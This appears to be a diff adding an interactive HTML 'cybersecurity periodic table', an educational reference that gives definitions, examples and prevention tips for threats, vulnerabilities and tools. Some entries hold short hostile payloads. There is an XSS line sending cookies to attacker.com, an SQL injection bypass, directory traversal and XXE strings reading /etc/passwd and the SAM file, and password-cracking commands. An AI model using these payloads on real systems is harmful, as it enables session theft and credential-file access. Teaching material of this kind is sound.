@@ -1,0 +1,1847 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <meta name="description" content="Interactive Cybersecurity Landscape Periodic Table - Comprehensive reference for threats, vulnerabilities, tools, frameworks, and security roles">
+    <title>Interactive Cybersecurity Periodic Table</title>
+    <style>
+        @page {
+            size: A3 landscape;
+            margin: 10mm;
+        }
+        
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #141414;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 100%;
+            width: 100%;
+            margin: 0 auto;
+            background: #1f1f1f;
+            padding: 2.5vw;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+        }
+        
+        h1 {
+            text-align: center;
+            font-size: clamp(20px, 4vw, 42px);
+            margin-bottom: clamp(8px, 1vw, 10px);
+            color: #E50914;
+            font-weight: bold;
+            letter-spacing: 2px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #f0f0f0;
+            margin-bottom: clamp(20px, 3vw, 30px);
+            font-size: clamp(11px, 1.5vw, 14px);
+        }
+        
+        .legend {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: clamp(10px, 1.5vw, 15px);
+            margin-bottom: clamp(25px, 4vw, 40px);
+            padding: clamp(15px, 2vw, 20px);
+            background: #2a2a2a;
+            border-radius: 8px;
+            max-width: 100%;
+        }
+        
+        .legend-item {
+            display: flex;
+            align-items: center;
+            gap: clamp(8px, 1.2vw, 12px);
+            font-size: clamp(12px, 1.5vw, 16px);
+            font-weight: 600;
+            color: #f0f0f0;
+        }
+        
+        .legend-box {
+            width: clamp(32px, 4vw, 40px);
+            height: clamp(32px, 4vw, 40px);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: clamp(9px, 1.2vw, 11px);
+            flex-shrink: 0;
+        }
+        
+        .threat { background: #dc3545; }
+        .vulnerability { background: #fd7e14; }
+        .tool { background: #28a745; }
+        .framework { background: #007bff; }
+        .concept { background: #6c757d; }
+        .defensive { background: #6c757d; color: #fff; }
+        .role { background: linear-gradient(135deg, #8B0000 0%, #B91C1C 100%); }
+        
+        .periodic-table {
+            display: grid;
+            grid-template-columns: repeat(16, 1fr);
+            gap: clamp(2px, 0.6vw, 6px);
+            margin-bottom: clamp(20px, 3vw, 30px);
+            width: 100%;
+        }
+        
+        .element {
+            aspect-ratio: 1;
+            border-radius: clamp(3px, 0.6vw, 6px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: clamp(3px, 0.8vw, 8px);
+            color: white;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            position: relative;
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
+            min-width: 0;
+            min-height: 0;
+        }
+        
+        .element:hover,
+        .element:active {
+            transform: translateY(-2px) scale(1.03);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.4);
+            z-index: 10;
+        }
+        
+        .element-symbol {
+            font-size: clamp(8px, 2vw, 20px);
+            font-weight: bold;
+            margin-bottom: clamp(2px, 0.4vw, 4px);
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+        }
+        
+        .element-name {
+            font-size: clamp(5px, 0.9vw, 9px);
+            line-height: 1.2;
+            font-weight: 500;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+        }
+        
+        .empty {
+            background: transparent;
+            box-shadow: none;
+        }
+        
+        .empty:hover {
+            transform: none;
+        }
+        
+        .roles-section {
+            display: grid;
+            grid-template-columns: repeat(16, 1fr);
+            gap: clamp(2px, 0.6vw, 6px);
+            margin-top: clamp(15px, 2.5vw, 25px);
+            width: 100%;
+        }
+        
+        /* Popup styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1f1f1f;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 50px rgba(0,0,0,0.8);
+            z-index: 1000;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            border: 1px solid #333;
+        }
+        
+        .popup.active {
+            display: block;
+            animation: popupIn 0.3s ease-out;
+        }
+        
+        @keyframes popupIn {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+        
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 999;
+        }
+        
+        .popup-overlay.active {
+            display: block;
+        }
+        
+        .popup-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 3px solid #2a2a2a;
+        }
+        
+        .popup-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+        
+        .popup-title {
+            flex: 1;
+        }
+        
+        .popup-title h2 {
+            font-size: 28px;
+            margin-bottom: 5px;
+            color: #E50914;
+        }
+        
+        .popup-category {
+            font-size: 14px;
+            color: #aaa;
+            font-weight: 500;
+        }
+        
+        .popup-close {
+            background: #2a2a2a;
+            border: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            font-size: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+            color: #f0f0f0;
+        }
+        
+        .popup-close:hover {
+            background: #E50914;
+        }
+        
+        .popup-content h3 {
+            color: #E50914;
+            margin-top: 20px;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .popup-content p {
+            line-height: 1.7;
+            color: #f0f0f0;
+            margin-bottom: 15px;
+        }
+        
+        .popup-content ul {
+            margin-left: 20px;
+            margin-bottom: 15px;
+        }
+        
+        .popup-content li {
+            margin-bottom: 8px;
+            line-height: 1.6;
+            color: #ddd;
+        }
+        
+        .example-box {
+            background: #2a2a2a;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #E50914;
+            margin: 15px 0;
+        }
+        
+        .example-box code {
+            background: #1a1a1a;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #4CAF50;
+        }
+        
+        @media print {
+            body {
+                background: white;
+                padding: 0;
+            }
+            
+            .container {
+                box-shadow: none;
+                padding: 20px;
+            }
+            
+            .element:hover {
+                transform: none;
+            }
+            
+            .popup, .popup-overlay {
+                display: none !important;
+            }
+        }
+        
+        /* Mobile popup adjustments */
+        @media (max-width: 768px) {
+            .popup {
+                width: 95%;
+                max-width: 95%;
+                padding: clamp(15px, 4vw, 25px);
+                max-height: 85vh;
+            }
+            
+            .popup-header {
+                flex-wrap: wrap;
+            }
+            
+            .popup-icon {
+                width: clamp(45px, 10vw, 60px);
+                height: clamp(45px, 10vw, 60px);
+                font-size: clamp(18px, 4vw, 24px);
+            }
+            
+            .popup-title h2 {
+                font-size: clamp(20px, 5vw, 28px);
+            }
+            
+            .popup-content h3 {
+                font-size: clamp(16px, 4vw, 18px);
+            }
+            
+            .popup-content p,
+            .popup-content li {
+                font-size: clamp(13px, 3.5vw, 16px);
+            }
+        }
+        
+        /* Ensure no horizontal scrolling */
+        html, body {
+            overflow-x: hidden;
+            max-width: 100vw;
+        }
+        
+        .container {
+            overflow-x: hidden;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CYBERSECURITY LANDSCAPE MAP</h1>
+        <p class="subtitle">Click any element to learn more about it</p>
+        
+        <div class="legend">
+            <div class="legend-item">
+                <div class="legend-box threat">■</div>
+                <span>Threats</span>
+            </div>
+            <div class="legend-item">
+                <div class="legend-box framework">■</div>
+                <span>Frameworks & Standards</span>
+            </div>
+            <div class="legend-item">
+                <div class="legend-box vulnerability">■</div>
+                <span>Vulnerabilities</span>
+            </div>
+            <div class="legend-item">
+                <div class="legend-box concept">■</div>
+                <span>Concepts & Operations</span>
+            </div>
+            <div class="legend-item">
+                <div class="legend-box tool">■</div>
+                <span>Tools</span>
+            </div>
+            <div class="legend-item">
+                <div class="legend-box defensive">■</div>
+                <span>Defensive Measures</span>
+            </div>
+            <div class="legend-item">
+                <div class="legend-box role">■</div>
+                <span>Roles & Protocols</span>
+            </div>
+        </div>
+        
+        <div class="periodic-table" id="periodicTable"></div>
+        
+        <div class="roles-section" id="rolesSection"></div>
+    </div>
+    
+    <div class="popup-overlay" id="popupOverlay"></div>
+    <div class="popup" id="popup">
+        <div class="popup-header">
+            <div class="popup-icon" id="popupIcon"></div>
+            <div class="popup-title">
+                <h2 id="popupTitle"></h2>
+                <div class="popup-category" id="popupCategory"></div>
+            </div>
+            <button class="popup-close" id="popupClose">×</button>
+        </div>
+        <div class="popup-content" id="popupContent"></div>
+    </div>
+    
+    <script>
+        // Data structure for all elements
+        const elements = {
+            // THREATS
+            'PH': {
+                name: 'Phishing',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'A social engineering attack where attackers impersonate trusted entities to trick victims into revealing sensitive information, downloading malware, or performing actions that compromise security.',
+                examples: [
+                    'Email phishing: Fake emails appearing to be from banks or services requesting password resets',
+                    'Spear phishing: Targeted attacks against specific individuals using personalized information',
+                    'Whaling: High-level executives targeted with sophisticated phishing campaigns',
+                    'Smishing: Phishing via SMS text messages',
+                    'Vishing: Voice phishing through phone calls'
+                ],
+                prevention: 'Verify sender authenticity, hover over links before clicking, enable multi-factor authentication, and provide security awareness training.'
+            },
+            'MW': {
+                name: 'Malware',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'Malicious software designed to damage, disrupt, or gain unauthorized access to computer systems. It encompasses various types of harmful programs including viruses, worms, trojans, and ransomware.',
+                examples: [
+                    'Viruses: Self-replicating programs that attach to legitimate files',
+                    'Worms: Standalone malware that spreads across networks automatically',
+                    'Trojans: Disguised as legitimate software to deceive users',
+                    'Backdoors: Provide unauthorized remote access to systems',
+                    'Cryptominers: Use victim resources to mine cryptocurrency'
+                ],
+                prevention: 'Use antivirus software, keep systems updated, avoid suspicious downloads, and implement endpoint detection and response (EDR) solutions.'
+            },
+            'RW': {
+                name: 'Ransomware',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'Malware that encrypts victim files or locks systems, demanding payment (usually cryptocurrency) for decryption keys. Modern variants also threaten to publish stolen data if ransom is not paid.',
+                examples: [
+                    'WannaCry: Exploited Windows vulnerability affecting 200,000+ computers globally',
+                    'CryptoLocker: Pioneer of modern crypto-ransomware',
+                    'Ryuk: Targeted ransomware focusing on large organizations',
+                    'REvil/Sodinokibi: Ransomware-as-a-Service operation',
+                    'Double extortion: Encrypt data AND threaten to publish it'
+                ],
+                prevention: 'Maintain offline backups, implement network segmentation, patch systems regularly, and train employees to recognize phishing attempts.'
+            },
+            'CS': {
+                name: 'Cross-Site Scripting (XSS)',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'A web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users, potentially stealing cookies, session tokens, or other sensitive information.',
+                examples: [
+                    'Reflected XSS: Malicious script reflected off web server via search results or error messages',
+                    'Stored XSS: Script permanently stored on target server (comment fields, user profiles)',
+                    'DOM-based XSS: Vulnerability exists in client-side code rather than server-side',
+                    'Cookie theft: <code>&lt;script&gt;document.location="http://attacker.com?c="+document.cookie&lt;/script&gt;</code>'
+                ],
+                prevention: 'Validate and sanitize all input, implement Content Security Policy (CSP), encode output data, and use modern frameworks with built-in XSS protection.'
+            },
+            'DD': {
+                name: 'DDoS',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'Distributed Denial of Service attack that overwhelms a target system, service, or network with a flood of traffic from multiple sources, making it unavailable to legitimate users.',
+                examples: [
+                    'Volumetric attacks: UDP floods, ICMP floods overwhelming bandwidth',
+                    'Protocol attacks: SYN floods, Ping of Death exploiting protocol weaknesses',
+                    'Application layer attacks: HTTP floods targeting web applications',
+                    'Amplification attacks: DNS amplification, NTP amplification',
+                    'Mirai botnet: IoT devices weaponized for massive DDoS attacks'
+                ],
+                prevention: 'Use CDN services, implement rate limiting, deploy DDoS protection services (Cloudflare, AWS Shield), and maintain excess bandwidth capacity.'
+            },
+            'SW': {
+                name: 'Spyware',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'Malicious software that secretly monitors and collects user information without their knowledge, including browsing habits, keystrokes, passwords, and other sensitive data.',
+                examples: [
+                    'Keyloggers: Record every keystroke including passwords and credit card numbers',
+                    'Screen capture: Takes screenshots of user activity',
+                    'Adware with spyware: Tracks browsing to serve targeted ads',
+                    'Mobile spyware: Pegasus targeting smartphones for surveillance',
+                    'Banking trojans: Zeus, Emotet stealing financial credentials'
+                ],
+                prevention: 'Install reputable anti-spyware software, avoid downloading from untrusted sources, keep software updated, and review app permissions regularly.'
+            },
+            'AD': {
+                name: 'Adware',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'Software that automatically displays or downloads advertising material when a user is online. While not always malicious, it can track user behavior and slow down systems.',
+                examples: [
+                    'Browser hijackers: Change homepage and search engine settings',
+                    'Pop-up generators: Display unwanted advertisements',
+                    'Bundled software: Free programs that include adware components',
+                    'Toolbar installations: Browser extensions showing persistent ads',
+                    'Redirect malware: Redirects searches to advertising sites'
+                ],
+                prevention: 'Use ad blockers, carefully review installation options, download software from official sources, and regularly scan for potentially unwanted programs (PUPs).'
+            },
+            'TN': {
+                name: 'Trojan',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'Malware disguised as legitimate software to trick users into executing it. Unlike viruses, trojans do not self-replicate but can create backdoors, steal data, or download additional malware.',
+                examples: [
+                    'Remote Access Trojans (RAT): Provide complete control over infected systems',
+                    'Banking Trojans: Steal financial credentials and intercept transactions',
+                    'Downloader Trojans: Download and install additional malware',
+                    'Backdoor Trojans: Create hidden access points for attackers',
+                    'Fake antivirus: Pretends to be security software while being malicious'
+                ],
+                prevention: 'Download software only from trusted sources, use antivirus with behavioral detection, keep systems patched, and be cautious with email attachments.'
+            },
+            'RK': {
+                name: 'Rootkit',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'Stealthy malware designed to hide the existence of certain processes or programs from normal methods of detection, often providing privileged access to a computer while remaining hidden.',
+                examples: [
+                    'Kernel-mode rootkits: Operate at the operating system level',
+                    'User-mode rootkits: Run with regular user privileges',
+                    'Bootkit: Infects the boot process before OS loads',
+                    'Firmware rootkits: Embedded in device firmware (UEFI/BIOS)',
+                    'Sony BMG rootkit: Infamous 2005 case of DRM containing rootkit'
+                ],
+                prevention: 'Use UEFI Secure Boot, maintain system integrity with trusted boot processes, deploy advanced anti-rootkit tools, and perform regular system scans.'
+            },
+            'SI': {
+                name: 'SQL Injection',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'A code injection technique that exploits security vulnerabilities in database layer of an application, allowing attackers to execute malicious SQL statements that control a database server.',
+                examples: [
+                    'Authentication bypass: <code>SELECT * FROM users WHERE username="admin" OR "1"="1"</code>',
+                    'Data extraction: Using UNION statements to retrieve additional data',
+                    'Database modification: INSERT, UPDATE, DELETE statements to alter data',
+                    'Command execution: Using xp_cmdshell to execute system commands',
+                    'Blind SQL injection: Inferring data by application responses'
+                ],
+                prevention: 'Use parameterized queries/prepared statements, validate input, implement least privilege database access, and use ORM frameworks properly.'
+            },
+            'BF': {
+                name: 'Brute Force',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'An attack method that systematically tries all possible combinations of passwords or encryption keys until the correct one is found, often automated using specialized tools.',
+                examples: [
+                    'Password cracking: Trying dictionary words and common passwords',
+                    'Credential stuffing: Using leaked username/password combinations',
+                    'SSH brute forcing: Automated attempts to access SSH services',
+                    'Hash cracking: Trying to reverse password hashes',
+                    'PIN attacks: Trying all possible 4-6 digit combinations'
+                ],
+                prevention: 'Enforce strong password policies, implement account lockout policies, use multi-factor authentication, deploy rate limiting, and monitor failed login attempts.'
+            },
+            'KL': {
+                name: 'Keylogger',
+                category: 'threat',
+                categoryName: 'Threat',
+                definition: 'Software or hardware device that records keystrokes made by a user, often used to steal passwords, credit card numbers, and other sensitive information without the user\'s knowledge.',
+                examples: [
+                    'Software keyloggers: Programs running in background recording keystrokes',
+                    'Hardware keyloggers: Physical devices attached between keyboard and computer',
+                    'Form grabbers: Capture data before encryption in web forms',
+                    'Clipboard logging: Records copied text including passwords',
+                    'Screen loggers: Combine keylogging with screenshots'
+                ],
+                prevention: 'Use on-screen keyboards for sensitive input, enable anti-keylogging features in security software, and use password managers with auto-fill.'
+            },
+            
+            // VULNERABILITIES
+            'US': {
+                name: 'Unpatched Software',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'Software that has not been updated with the latest security patches, leaving known vulnerabilities exposed that attackers can exploit.',
+                examples: [
+                    'EternalBlue: Exploited unpatched Windows SMB vulnerability for WannaCry',
+                    'Log4Shell: Critical vulnerability in Log4j library affecting millions of systems',
+                    'ProxyLogon: Microsoft Exchange vulnerabilities exploited in 2021',
+                    'Heartbleed: OpenSSL vulnerability allowing memory content theft',
+                    'Zero-day exploits: Attacks on unknown vulnerabilities before patches exist'
+                ],
+                prevention: 'Implement automated patch management, maintain asset inventory, prioritize critical patches, test patches in staging environments, and subscribe to security advisories.'
+            },
+            'OP': {
+                name: 'Open Ports',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'Network ports that are accessible from outside the network but are either unnecessary, misconfigured, or running vulnerable services, providing potential entry points for attackers.',
+                examples: [
+                    'Port 23 (Telnet): Unencrypted remote access',
+                    'Port 21 (FTP): Unencrypted file transfer with credentials in plaintext',
+                    'Port 445 (SMB): Target for ransomware and worms',
+                    'Port 3389 (RDP): Exposed Remote Desktop vulnerable to brute force',
+                    'Database ports: MySQL (3306), PostgreSQL (5432) exposed to internet'
+                ],
+                prevention: 'Conduct regular port scans, close unnecessary ports, use firewall rules, implement VPN for remote access, and follow principle of least exposure.'
+            },
+            'BA': {
+                name: 'Broken Authentication',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'Weaknesses in authentication mechanisms that allow attackers to compromise passwords, keys, session tokens, or exploit implementation flaws to assume other users\' identities.',
+                examples: [
+                    'Weak password requirements: Allowing "password123" or short passwords',
+                    'Credential stuffing: No protection against automated credential testing',
+                    'Session fixation: Attacker sets session ID before user authentication',
+                    'Missing session timeout: Sessions remain active indefinitely',
+                    'Insecure password recovery: "Forgot password" with weak verification'
+                ],
+                prevention: 'Implement multi-factor authentication, enforce strong password policies, rotate session IDs after login, set session timeouts, and monitor authentication attempts.'
+            },
+            'PE': {
+                name: 'Privilege Escalation',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'Exploitation of a bug, design flaw, or misconfiguration to gain elevated access to resources that are normally protected, allowing an attacker to perform unauthorized actions.',
+                examples: [
+                    'Vertical escalation: Regular user gains admin/root privileges',
+                    'Horizontal escalation: Access another user\'s data at same privilege level',
+                    'Kernel exploits: EternalBlue, Dirty COW gaining system-level access',
+                    'SUID binaries: Misconfigured setuid programs on Unix/Linux',
+                    'Windows token impersonation: Stealing authentication tokens'
+                ],
+                prevention: 'Apply principle of least privilege, regularly patch systems, conduct privilege audits, implement proper access controls, and monitor for unusual privilege usage.'
+            },
+            'CJ': {
+                name: 'Code Injection',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'A security flaw that allows an attacker to introduce malicious code into a vulnerable application, which is then executed by the application, potentially compromising the entire system.',
+                examples: [
+                    'SQL Injection: Injecting SQL commands into database queries',
+                    'Command Injection: OS commands executed through vulnerable applications',
+                    'LDAP Injection: Manipulating LDAP queries for authentication bypass',
+                    'XML Injection: Malicious XML content altering application logic',
+                    'Template Injection: Server-side template engines executing arbitrary code'
+                ],
+                prevention: 'Validate and sanitize all user input, use parameterized queries, implement input whitelisting, apply principle of least privilege, and conduct code reviews.'
+            },
+            'MF': {
+                name: 'Misconfigured Firewall',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'Incorrectly configured firewall rules that either block legitimate traffic or allow unauthorized access, creating security gaps in network defense.',
+                examples: [
+                    'Default-allow rules: Everything permitted unless explicitly blocked',
+                    'Overly permissive rules: Any-to-any rules allowing all traffic',
+                    'Unused rule sets: Old rules never cleaned up creating confusion',
+                    'Missing egress filtering: No control over outbound traffic',
+                    'Shadow rules: Conflicting rules with unintended access'
+                ],
+                prevention: 'Regular rule reviews and cleanup, implement least privilege access, document all rules, conduct firewall audits, and use firewall management tools.'
+            },
+            'DE': {
+                name: 'Sensitive Data Exposure',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'Inadequate protection of sensitive data such as financial information, health records, or personal identifiable information (PII), leading to unauthorized access or disclosure.',
+                examples: [
+                    'Unencrypted data transmission: Credentials or PII sent over HTTP',
+                    'Weak encryption: Using outdated algorithms like MD5 or DES',
+                    'Data in logs: Passwords or credit cards logged in plain text',
+                    'Backup exposure: Unencrypted backups accessible to unauthorized users',
+                    'API responses: Excessive data returned including sensitive fields'
+                ],
+                prevention: 'Encrypt data at rest and in transit, use strong encryption algorithms, implement data classification, mask sensitive data in logs, and conduct data discovery assessments.'
+            },
+            'XS': {
+                name: 'Cross-Site Scripting (XSS)',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'A vulnerability that enables attackers to inject client-side scripts into web pages viewed by other users, potentially accessing cookies, session tokens, or other sensitive browser information.',
+                examples: [
+                    'Reflected XSS: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> in URL parameters',
+                    'Stored XSS: Malicious script saved in database and displayed to all users',
+                    'DOM-based XSS: Client-side JavaScript vulnerability',
+                    'Session hijacking: Stealing session cookies via XSS',
+                    'Phishing via XSS: Injecting fake login forms'
+                ],
+                prevention: 'Sanitize input, encode output, implement Content Security Policy (CSP), use HTTP-only cookies, and validate data on both client and server.'
+            },
+            'HR': {
+                name: 'Hard-coded Credentials',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'Passwords, API keys, or other authentication credentials embedded directly in source code, configuration files, or scripts, making them easily discoverable by attackers.',
+                examples: [
+                    'Database passwords in code: <code>conn = "Server=db;Password=admin123;"</code>',
+                    'API keys in public repos: AWS keys committed to GitHub',
+                    'Default credentials: Admin/admin never changed in production',
+                    'Backdoor accounts: Developer accounts with hard-coded passwords',
+                    'Mobile app secrets: API keys decompiled from mobile applications'
+                ],
+                prevention: 'Use environment variables, implement secrets management tools (HashiCorp Vault, AWS Secrets Manager), scan repositories for secrets, and rotate credentials regularly.'
+            },
+            'RC': {
+                name: 'Race Condition',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'A vulnerability that occurs when the behavior of software depends on the sequence or timing of events, which can be exploited when multiple threads access shared resources concurrently.',
+                examples: [
+                    'TOCTOU (Time-of-check to time-of-use): File permissions changed between check and use',
+                    'Dirty COW: Linux kernel race condition allowing privilege escalation',
+                    'Payment processing: Double-spending by submitting simultaneous transactions',
+                    'File system race conditions: Creating symlinks during file operations',
+                    'Database race conditions: Concurrent updates causing data inconsistency'
+                ],
+                prevention: 'Implement proper locking mechanisms, use atomic operations, apply transactional integrity, conduct concurrency testing, and review multi-threaded code carefully.'
+            },
+            'ID': {
+                name: 'Insecure Deserialization',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'A vulnerability where untrusted data is used to reconstruct objects, potentially allowing attackers to execute arbitrary code, inject malicious objects, or perform other attacks.',
+                examples: [
+                    'Java deserialization: Apache Commons Collections gadget chains',
+                    'Python pickle: Arbitrary code execution through crafted pickle data',
+                    'PHP unserialize(): Object injection leading to code execution',
+                    '.NET deserialization: ViewState exploitation for RCE',
+                    'Node.js deserialization: node-serialize remote code execution'
+                ],
+                prevention: 'Avoid deserializing untrusted data, use safe deserialization libraries, implement integrity checks with digital signatures, and use whitelist validation of serialized classes.'
+            },
+            'WA': {
+                name: 'Weak Authentication',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'Inadequate authentication mechanisms that fail to properly verify user identity, making it easier for attackers to gain unauthorized access through various attack methods.',
+                examples: [
+                    'No rate limiting: Unlimited password guessing attempts',
+                    'Predictable session IDs: Sequential or easily guessable tokens',
+                    'Missing MFA: Single-factor authentication for sensitive operations',
+                    'Weak password reset: Security questions with public answers',
+                    'Basic authentication: Credentials sent in base64 encoding over HTTP'
+                ],
+                prevention: 'Implement multi-factor authentication, use strong session management, enforce account lockout policies, implement CAPTCHA, and use modern authentication protocols (OAuth 2.0, OIDC).'
+            },
+            'DT': {
+                name: 'Directory Traversal',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'A vulnerability that allows attackers to access files and directories outside the intended folder structure by manipulating file path references, potentially exposing sensitive system files.',
+                examples: [
+                    'Path traversal: <code>../../etc/passwd</code> to access system files',
+                    'URL encoding bypass: <code>..%2F..%2Fetc%2Fpasswd</code>',
+                    'Double encoding: <code>..%252F..%252Fetc%252Fpasswd</code>',
+                    'Windows traversal: <code>..\\..\\windows\\system32\\config\\sam</code>',
+                    'Null byte injection: <code>../../etc/passwd%00.jpg</code>'
+                ],
+                prevention: 'Validate and sanitize file paths, use whitelist of allowed files, implement chroot jails, avoid passing user input directly to file system APIs, and use built-in security functions.'
+            },
+            'BO': {
+                name: 'Buffer Overflow',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'A vulnerability where a program writes more data to a buffer than it can hold, potentially overwriting adjacent memory and allowing attackers to execute arbitrary code or crash the system.',
+                examples: [
+                    'Stack-based overflow: Overwriting return address to hijack execution',
+                    'Heap-based overflow: Corrupting heap metadata for code execution',
+                    'Integer overflow: Arithmetic overflow causing unexpected behavior',
+                    'Format string attacks: Using printf() vulnerabilities for memory corruption',
+                    'Classic examples: Morris Worm, Code Red, Slammer exploiting buffer overflows'
+                ],
+                prevention: 'Use memory-safe languages, implement bounds checking, enable DEP (Data Execution Prevention), use ASLR (Address Space Layout Randomization), and conduct thorough code reviews.'
+            },
+            'XM': {
+                name: 'XML External Entity (XXE)',
+                category: 'vulnerability',
+                categoryName: 'Vulnerability',
+                definition: 'A vulnerability in XML parsers that allows attackers to access local or remote files, perform server-side request forgery, or cause denial of service through malicious XML input.',
+                examples: [
+                    'File disclosure: <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</code>',
+                    'SSRF via XXE: Making internal network requests',
+                    'Billion Laughs Attack: XML bomb causing denial of service',
+                    'Out-of-band XXE: Exfiltrating data through external DTD',
+                    'Blind XXE: Exploiting XXE without direct output'
+                ],
+                prevention: 'Disable external entity processing in XML parsers, use less complex data formats (JSON), validate XML against schema, implement input validation, and use updated XML processors.'
+            },
+            
+            // TOOLS
+            'NM': {
+                name: 'Nmap',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Network Mapper - A powerful open-source tool for network discovery and security auditing, used to discover hosts, services, operating systems, and potential vulnerabilities.',
+                examples: [
+                    'Port scanning: <code>nmap -p- target.com</code> (scan all ports)',
+                    'Service detection: <code>nmap -sV target.com</code>',
+                    'OS fingerprinting: <code>nmap -O target.com</code>',
+                    'Vulnerability scanning: <code>nmap --script vuln target.com</code>',
+                    'Stealth scanning: <code>nmap -sS target.com</code> (SYN scan)'
+                ],
+                usage: 'Essential for network reconnaissance, penetration testing, security audits, and inventory management of network assets.'
+            },
+            'BS': {
+                name: 'Burp Suite',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Integrated platform for web application security testing, providing tools for mapping, analyzing, and testing web vulnerabilities through an intercepting proxy.',
+                examples: [
+                    'Intercepting proxy: Capture and modify HTTP/HTTPS requests',
+                    'Scanner: Automated vulnerability detection in web apps',
+                    'Intruder: Automated attacks for testing inputs and authentication',
+                    'Repeater: Manual testing of individual requests',
+                    'Decoder/Comparer: Encode/decode data and compare responses'
+                ],
+                usage: 'Standard tool for web application penetration testing, bug bounty hunting, and security assessments of APIs and web services.'
+            },
+            'JR': {
+                name: 'John the Ripper',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Fast password cracker supporting multiple hash and cipher types, used for detecting weak passwords through dictionary attacks, brute force, and hybrid modes.',
+                examples: [
+                    'Dictionary attack: <code>john --wordlist=passwords.txt hashes.txt</code>',
+                    'Brute force: <code>john --incremental hashes.txt</code>',
+                    'Format detection: <code>john --format=raw-md5 hashes.txt</code>',
+                    'Cracking shadow file: <code>unshadow passwd shadow > mypasswd.txt</code>',
+                    'Custom rules: Creating mangling rules for word variations'
+                ],
+                usage: 'Password auditing, recovering lost passwords, testing password strength policies, and forensic investigations.'
+            },
+            'MZ': {
+                name: 'Metasploit',
+                category: 'tool',
+                categoryName: 'Security Tool',
+                definition: 'Comprehensive penetration testing framework providing exploits, payloads, auxiliary modules, and post-exploitation tools for security testing and vulnerability validation.',
+                examples: [
